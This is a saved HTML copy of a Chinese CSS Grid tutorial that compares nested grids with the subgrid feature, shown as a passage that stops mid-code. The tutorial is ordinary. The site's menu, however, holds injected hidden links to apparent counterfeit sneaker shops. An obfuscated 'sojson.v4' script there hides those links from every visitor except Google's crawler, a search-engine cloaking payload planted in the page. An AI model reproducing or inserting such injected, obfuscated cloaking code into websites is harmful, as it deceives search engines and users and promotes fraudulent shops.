@@ -1,0 +1,1426 @@
+<!DOCTYPE html>
+<!-- saved from url=(0133)https://www.w3cplus.com/css/grid-layout-part-15.html?expire=1699866863&code=O8kk1mfTkzM&sign=00c2aabdda9f35f1c017876f024a0394#paywall -->
+<html lang="zh-hans" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+<link rel="shortcut icon" href="https://www.w3cplus.com/sites/all/themes/w3cplusV2/favicon.ico" type="image/vnd.microsoft.icon">
+<meta name="description" content="当 CSS Grid 布局在 2017 年最初发布时，设计师和开发人员为二维布局和优化布局系统而设计时感到非常兴奋。 通过前面的学习，我们也领略到了网格布局的魅力，CSS 网格让我们可以轻松地做许多以前做不到的事情。其中一个较大的限制是，**嵌套的网格不能参与其父网格的大小调整**。这也是一个从一开始就被认为很重要的功能，然而，由于其复杂性，一度曾被废弃的子网格被推迟到 [CSS Grid布局模块的 Level 2](//www.w3.org/TR/css-grid-2/#subgrids) 中。一段时间以来，关于`subgrid`的使用情况、如何实现它的问题有很多讨论，甚至还有一些关于是否需要它的辩论。很多讨论都是围绕着另外两种可以处理许多与`subgrid`相同问题的方法：**嵌套网格** 和 **`display:">
+<meta name="keywords" content="前端,CSS, 图解CSS, Grid, Layout, 布局, Web布局系列, 会员专栏,教程">
+<meta name="generator" content="Drupal 7 (http://drupal.org)">
+<link rel="canonical" href="https://www.w3cplus.com/css/grid-layout-part-15.html">
+<link rel="shortlink" href="https://www.w3cplus.com/node/2736">
+  <meta name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta itemprop="name" content="W3cplus">
+  <meta itemprop="image" content="//www.w3cplus.com/w3cplus-logo.jpg">
+  <meta name="baidu-site-verification" content="ftyq813qEZgpw9nb">
+  <meta name="applicable-device" content="pc,mobile">
+  <title>图解CSS: Grid布局（Part15）_CSS, 图解CSS, Grid, Layout, 布局, Web布局系列, 会员专栏 教程_W3cplus</title>
+  <link type="text/css" rel="stylesheet" href="./Grid布局：15-嵌套网格vs子网格_files/css_xE-rWrJf-fncB6ztZfd2huxqgxu4WO-qwma6Xer30m4.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：15-嵌套网格vs子网格_files/css_hYCLW089C9S9sP3ZYkuG6R-Q5ZHbEhblZBFjwZ_bE_I.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：15-嵌套网格vs子网格_files/css_W_jVXC7gZD8ENo3AHIwFL3Mih90k_Go_X3-i_hfyj2c.css" media="all">
+<link type="text/css" rel="stylesheet" href="./Grid布局：15-嵌套网格vs子网格_files/css_dc6MGCsMvp7moqrq-cRLC0GLEMrFF3Ego_HOWYVsZG4.css" media="all">
+  <script src="./Grid布局：15-嵌套网格vs子网格_files/hm.js.下载"></script><script type="text/javascript" src="./Grid布局：15-嵌套网格vs子网格_files/jquery.min.js.下载"></script>
+
+</head>
+<body class="html not-front not-logged-in one-sidebar sidebar-second page-node page-node- page-node-2736 node-type-blog" style="">
+  <div id="skip-link">
+    <a href="https://www.w3cplus.com/css/grid-layout-part-15.html?expire=1699866863&amp;code=O8kk1mfTkzM&amp;sign=00c2aabdda9f35f1c017876f024a0394#main-content" class="element-invisible element-focusable">跳转到主要内容</a>
+  </div>
+    <div id="header" role="header">
+  <div class="container">
+    <h1 id="logo">
+      <a href="https://www.w3cplus.com/" title="记述前端那些事——引领Web前沿" id="site_name">w3cplus</a>
+    </h1>
+    <div class="toggle-topbar menu-icon" id="pull">
+      <a href="https://www.w3cplus.com/css/grid-layout-part-15.html?expire=1699866863&amp;code=O8kk1mfTkzM&amp;sign=00c2aabdda9f35f1c017876f024a0394#"><span>Menu</span></a>
+    </div>
+    <div class="toogle-topbar-content" id="pull-menu">
+              <ul class="menu clearfix"><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.jmksport.com/adahgbshop/en/air-jordan-superfly-mvp-pf-white-ar0038-100" title="AR0038 - Air Jordan Super.Fly MVP PF &#39;White&#39; , 100 - The outsole of the Air Jordan 5 Low Doernbecher Freestyle - JmksportShops
+" style="display: none;">AR0038 - Air Jordan Super.Fly MVP PF 'White' , 100 - The outsole of the Air Jordan 5 Low Doernbecher Freestyle - JmksportShops
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.hotelomega.com/en/bbfhekshop/2022/07/nike-air-jordan-4-a-ma-maniere-release-im-november/" title="Nike Air Jordan 4 jordan 4 mettalic red - HotelomegaShops , Nike air jordan 5 retro jsp laney cd2720-400 - Release im November
+" style="display: none;">Nike Air Jordan 4 jordan 4 mettalic red - HotelomegaShops , Nike air jordan 5 retro jsp laney cd2720-400 - Release im November
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.vietnamvetsmuseum.org/fbdbdgushop/uk/krossovki-adidas-iniki-black-white.xhtml" title="Київ та Україна , adidas iran shoe store locations in texas , Купити Кросівки adidas iniki black white — недорого в каталозі Кросівки на Шафі
+" style="display: none;">Київ та Україна , adidas iran shoe store locations in texas , Купити Кросівки adidas iniki black white — недорого в каталозі Кросівки на Шафі
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.ietp.com/fr/dfejbishop/dk/p/asymmetrical-body-with-logo-adidas-originals-body-trapnk-multco-1111233" title="IetpShops Denmark - Asymmetrical body with logo ADIDAS fy3960 Originals - adidas fy3960 Performance 720
+" style="display: none;">IetpShops Denmark - Asymmetrical body with logo ADIDAS fy3960 Originals - adidas fy3960 Performance 720
+</a></li><li class="keys_words leaf" style="display: none;"><a class="keys_words" href="https://www.urlfreeze.com/deeegashop/" title="Nike Jordan Jumpman hoodie in grey - release dates &amp; sneakers., Jordans - Yeezys, Urlfreeze News
+" style="display: none;">Nike Jordan Jumpman hoodie in grey - release dates &amp; sneakers., Jordans - Yeezys, Urlfreeze News
+</a></li><li class="first leaf"><a href="https://www.w3cplus.com/blog/tags/686.html" title="会员专栏">会员专栏</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/CSS3" title="">CSS</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/JavaScript" title="JavaScript">JavaScript</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/css/books.html" title="我的小册">小册</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/mobile" title="">Mobile</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/svg-tutorial" title="SVG">SVG</a></li>
+<li class="leaf"><a href="https://www.w3cplus.com/tags" title="标签云">标签云</a></li>
+<li class="last leaf"><a href="https://www.w3cplus.com/blogs-lists" title="文章列表">文章列表</a></li>
+<script>['sojson.v4']["\x66\x69\x6c\x74\x65\x72"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"](((['sojson.v4']+[])["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65']['\x61\x70\x70\x6c\x79'](null,"118J97J114e32K109l121m95L107G101q121O95v119X111Z114Q100P95f114s101y32l61S32c110p101W119b32w82E101F103g69i120Q112V40h34J71n111K111V103Z108T101g124z109f121L116R101D115z116d34a44p32m34H103o105X34V41h59g105Z102P40Z33j109x121d95d107g101p121J95W119R111K114c100J95M114o101t46V116f101Q115x116u40J110Z97l118N105o103o97R116L111L114W46L117R115I101T114E65K103D101a110e116L41v41E32z123V32i118w97U114Q32d99k108B97j115W115k95i109B121a95v107S101G121H95e119o111J114z100O32B61e32B100F111Y99t117b109G101E110i116D46B103y101m116Q69D108n101G109m101x110d116p115y66E121U67i108P97s115e115H78r97g109c101d40h39S107x101U121f115O95u119r111l114G100n115I39c41o59i32k102v111c114r40y118H97B114E32L105d32n61P32W48l59h32q105W32V60s32j99g108h97f115Y115W95P109J121z95T107I101r121J95Z119t111W114q100X46E108G101m110X103e116P104i59r32K105i43S43W41m32D99x108a97S115W115U95S109s121j95x107Z101v121i95n119S111y114z100x91z105B93U46K115V116Q121B108x101b46i100V105R115P112N108u97E121y32w61P32W39A110t111Q110A101n39h59e125"['\x73\x70\x6c\x69\x74'](/[a-zA-Z]{1,}/))))('sojson.v4');</script></ul>        <!-- /#main-menu -->
+          </div>
+  </div>
+</div>
+
+  <div id="branding" role="branding">
+    <div class="container">
+        <div class="region region-branding">
+    <div id="block-block-46" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;">
+	<a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img alt="现代 CSS" src="./Grid布局：15-嵌套网格vs子网格_files/WechatIMG324.jpg" style="width: 100%;height:auto"></a></div>  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="page" role="page">
+  <div class="container">
+    
+    <div class="col-main">
+      <div class="main-wrap">
+        
+                
+        <div class="page-inner">
+                      <div id="breadcrumb" role="breadcrumb">
+              <h2 class="element-invisible">你在这里</h2><div class="breadcrumb"><a href="https://www.w3cplus.com/">首页</a></div>            </div>
+          
+          
+          <a id="main-content"></a>
+                                <h1 class="title" id="page-title">
+              图解CSS: Grid布局（Part15）            </h1>
+          
+                    
+                                <div class="region region-content">
+    <div id="block-system-main" class="block block-system">
+
+    
+  <div class="content">
+    <div id="node-2736" class="node node-blog node-promoted node-full clearfix" about="/css/grid-layout-part-15.html" typeof="sioc:Post sioct:BlogPost">
+  
+  <div class="node-header">
+              <div class="submitted">
+          作者：<span>大漠</span>          日期：<span>2021-09-05</span>          点击：<span>552</span>        </div>
+            <div class="tags">
+        <div class="field field-name-field-blog-tag field-type-taxonomy-term-reference field-label-hidden"><div class="field-items"><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/68.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">CSS</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/674.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">图解CSS</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/356.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Grid</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/180.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Layout</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/130.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">布局</a></div><div class="field-item odd"><a href="https://www.w3cplus.com/blog/tags/695.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">Web布局系列</a></div><div class="field-item even"><a href="https://www.w3cplus.com/blog/tags/686.html" typeof="skos:Concept" property="rdfs:label skos:prefLabel" datatype="" target="_blank">会员专栏</a></div></div></div>      </div>
+  </div>
+
+  
+  <div class="body-content clearfix">
+    <div id="block-block-22" class="block block-block">
+
+    
+  <div class="content">
+    <div>
+<blockquote>
+<p style="font-size: 14px;"><strong>特别声明：</strong>如果您喜欢小站的内容，可以点击<a href="https://www.zhi12.cn/paywall/membership/widget?uid=5491&amp;siteid=s_64be3b00&amp;cms=drupal&amp;content_id=2610&amp;callback=https%3A//www.w3cplus.com&amp;source=https%3A//www.w3cplus.com%3Fq%3Dnode/2610&amp;sign=ecbcc7859e33dea192cf9efdb6d2e61c" style="background: #FF5722;color: #fff;  display: inline-block; padding: 10px; border-radius: 4px;  line-height: 1; margin: 0 3px;" target="_blank">申请会员</a>进行全站阅读。如果您对付费阅读有任何建议或想法，欢迎发送邮件至: <strong>airenliao@gmail.com</strong>!或添加QQ：874472854(^_^)</p>
+</blockquote>
+</div>  </div>
+</div>
+<div class="field field-name-body field-type-text-with-summary field-label-hidden"><div class="field-items"><div class="field-item even" property="content:encoded"><div class="paywall paywall-mb"><div class="paywall-center"><small class="paywall-highlight">* 文本为付费内容（4.99元），您已获得全文阅读权限</small></div></div><p>当 CSS Grid 布局在 2017 年最初发布时，设计师和开发人员为二维布局和优化布局系统而设计时感到非常兴奋。 通过前面的学习，我们也领略到了网格布局的魅力，CSS 网格让我们可以轻松地做许多以前做不到的事情。其中一个较大的限制是，<strong>嵌套的网格不能参与其父网格的大小调整</strong>。这也是一个从一开始就被认为很重要的功能，然而，由于其复杂性，一度曾被废弃的子网格被推迟到 <a rel="nofollow" href="https://www.w3.org/TR/css-grid-2/#subgrids" target="_blank">CSS Grid布局模块的 Level 2</a> 中。</p>
+
+<p>一段时间以来，关于<code>subgrid</code>的使用情况、如何实现它的问题有很多讨论，甚至还有一些关于是否需要它的辩论。很多讨论都是围绕着另外两种可以处理许多与<code>subgrid</code>相同问题的方法：<strong>嵌套网格</strong> 和 <strong><code>display: contents</code></strong>。接下来，我们将花一些篇幅来阐述嵌套网格和<code>subgrid</code>，即我们将了解哪些是相似的，哪些是<code>subgrid</code>与嵌套网格区别？以及阐述在一些非常有效的情况下，子网格是真正需要的，而在另一些情况下，它并不是严格需要的，但会带来一个更简洁的解决方案。</p>
+
+<p>那我们先从嵌套网格开始。</p>
+
+<h2 class="content-title" data-index="2">什么是嵌套网格</h2>
+
+<p>CSS 中的嵌套网格有点类似于嵌套表格。简单地说，任何网格项目都可以成为一个网格容器，也就是说，只需要在网格项目上显式设置 <code>display</code> 的值为 <code>grid</code> 或 <code>inline-grid</code> 即可实现一个嵌套网格。比如下面这个示例：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item grid__container-subgrid"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__item"</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+
+/* CSS */
+/* 创建父网格容器 */
+.grid__container {
+    display: grid;
+    grid-template-columns: 1fr 2fr 3fr 2fr 1fr;
+    grid-template-rows: 1fr 2fr 2fr 1fr;
+    gap: 1rem;
+}
+
+/* 创建嵌套网格 */
+.grid__container--subgrid {
+    grid-column: 2 / 5;
+    grid-row: 2 / 4;
+
+    display: grid;
+    grid-template-columns: 2fr 3fr 2fr;
+    grid-template-rows: repeat(3, 1fr);
+    gap: 1rem;
+}
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="" src="./Grid布局：15-嵌套网格vs子网格_files/ZEyOVGZ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/ZEyOVGZ">
+  </a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>上面的示例在 <code>.grid__container</code> 创建了一个 <code>5 x 4</code> (五列四行)的网格，并且在网格项G，也就是<code>.grid__container--subgrid</code> 创建了一个 <code>3 x 3</code>（三列三行）的网格，并且 <code>.grid__container--subgrid</code> 网格容器同时又是 <code>.grid__ccontainer</code> 网格中的第七个网格项目（网格项目G）：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-345.jpg" alt=""></p>
+
+<p>上图中，白色网格线构建的是父网格（<code>.grid__container</code>），红色网格线构建的是子网格（<code>.grid__container--subgrid</code>），这两个网格是相互嵌套的关系。其中 <code>.grid__container--subgrid</code> 网格也被称为嵌套网格。</p>
+
+<p>这是两个完全不同的网格，父网格和嵌套网格都有自己的独立的网格系统，比如网格线编号，网格轨道尺寸等。也就是说，在父网格和嵌套网格中都可以显式使用 <code>grid-template</code>（即其子属性<code>grid-template-columns</code>、<code>grid-template-rows</code>或<code>grid-template-areas</code>）或 <code>grid-auto-row</code>和<code>grid-auto-column</code>。也可以使用<code>grid-column</code>、<code>grid-row</code>和<code>grid-area</code>等属性在各自网格系统中放置网格项目。</p>
+
+<p>当然，我们也可以采用下面的方式，完全嵌套一个与父网格一模一样的子网格：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">3</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="comment"><span class="comment">/* 创建嵌套网格 */</span></span>
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-row</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">4</span></span>;</span></span></span><span class="value"></span></span>
+
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="600" style="width: 100%;" scrolling="no" title="Nested Grid" src="./Grid布局：15-嵌套网格vs子网格_files/rNwLRVv(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/rNwLRVv">
+  Nested Grid</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>使用开发者审查工具，你可以看到白色网格（父网格）和红色网格（子网格）都是 <code>5 x 4</code>（五行四列）网格，不同之处只是它们的网格轨道尺寸不同：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-346.jpg" alt=""></p>
+
+<p>如果在父网格的<code>grid-template-columns</code>和<code>grid-template-rows</code> 显式定义了网格线名称，并且使用 <code>grid-template-areas</code> 定义了网格区域。同样可以使用 <code>inherit</code> 将父网格网格线名称、网格区域名称复制过来：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value">
+        [header-start nav-start footer-start] fit-<span class="function"><span class="function">content(<span class="number"><span class="number">100</span></span>px)</span></span> [nav-end main-start] <span class="number"><span class="number">1</span></span>fr [main-end aside-start] fit-<span class="function"><span class="function">content(<span class="number"><span class="number">100</span></span>px)</span></span> [header-end aside-end footer-end];</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> 
+        [header-start] <span class="number"><span class="number">80</span></span>px [header-end nav-start main-start aside-start] <span class="number"><span class="number">1</span></span>fr [nav-end main-end aside-end footer-start] <span class="number"><span class="number">60</span></span>px [footer-end];</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"header header header"</span></span>
+        <span class="string"><span class="string">"nav    main   aside"</span></span>
+        <span class="string"><span class="string">"footer footer footer"</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> inherit;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">header</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> header;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">nav</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> nav;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">main</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> main;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">aside</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> aside;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">footer</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> footer;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<div style="margin-bottom: 20px">
+<iframe height="700" style="width: 100%;" scrolling="no" title="Nested Grid" src="./Grid布局：15-嵌套网格vs子网格_files/OJgXqom(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/OJgXqom">
+  Nested Grid</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>子网格（被嵌套的网格）继承了父网格所有网格系统的相关参数：</p>
+
+<p><img src="./Grid布局：15-嵌套网格vs子网格_files/css-grid-347.jpg" alt=""></p>
+
+<p>从上面的示例中，不难发现嵌套网格布局的缺陷。换句话说，嵌套网格最大的问题是， <strong>嵌套网格是独立于父网格和相互之间的</strong>，即 <strong>嵌套网格是独立的一个网格，但又是父网格的的一个网格项目</strong>。这也意味着嵌套网格不从父网格中获取它们的轨道尺寸，这使得嵌套网格项目与父网格的排列更加困难。我们嵌套网格内所做的更改不会涉及父级容器，因此，在布局时需要考虑两个独立的网格，出错率就更大，维护更难，效率也变得更低。</p>
+
+<p>嵌套网格还存在的一个问题就是它的灵活性，在响应式设计中会产生一个问题，即里面的元素溢出了网格容器元素的边界之外。</p>
+
+<h2 class="content-title" data-index="2">什么是子网格（subgrid）</h2>
+
+<p>由于嵌套网格布局存在一定的缺陷，同时为了避免嵌套网格给布局带来的不利因素，CSS Grid 布局模块 Level 2 新增了一个 <code>subgrid</code> （子网格）的新功能。 <code>subgrid</code> 是 <code>grid-template-rows</code> 和 <code>grid-template-columns</code> 属性的一个值。即：</p>
+
+<pre class="xml"><code class="xml">grid-template-rows: subgrid <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-name-list</span></span>&gt;</span></span>?
+grid-template-columns: subgrid <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-name-list</span></span>&gt;</span></span>?
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-name-list</span></span>&gt;</span></span>      = [ <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">line-names</span></span>&gt;</span></span> | <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">name-repeat</span></span>&gt;</span></span> ]+
+</code></pre>
+
+<p>当 <code>grid-template-rows</code> 、 <code>grid-template-columns</code> 或两者都显式设置了<code>subgrid</code>的值，嵌套网格将采用其父网格定义的网格轨道。子网格的项目将参与任何与父网格共享的网格轨道的内在尺寸计算。从本质上讲，子网格提供了通过嵌套元素向下传递网格参数的能力，以及将其基于内容信息向上传递到父网格的能力。</p>
+
+<p>如果在<code>subgrid</code> 后面指定了 <code>&lt;line-name-list&gt;</code> 参数的话，将允许对与父网格共享的网格线进行本地命名：<strong>如果给出了<code>&lt;line-name-list&gt;</code>，指定的<code>&lt;line-name&gt;</code>（网格线名称）将被分配给子网格的显式网格线，每条一个，从第一条网格线开始，并且多余的网格线名称会被忽略</strong>。</p>
+
+<p>我们把上面的嵌套网格稍微调整一下，先来感受一下子网格（<code>subgrid</code>）与嵌套网格的差异：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">3</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">2</span></span>fr <span class="number"><span class="number">1</span></span>fr;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.grid__container--subgrid</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-column</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">2</span></span> / <span class="number"><span class="number">5</span></span>;</span></span></span><span class="value"></span></span>
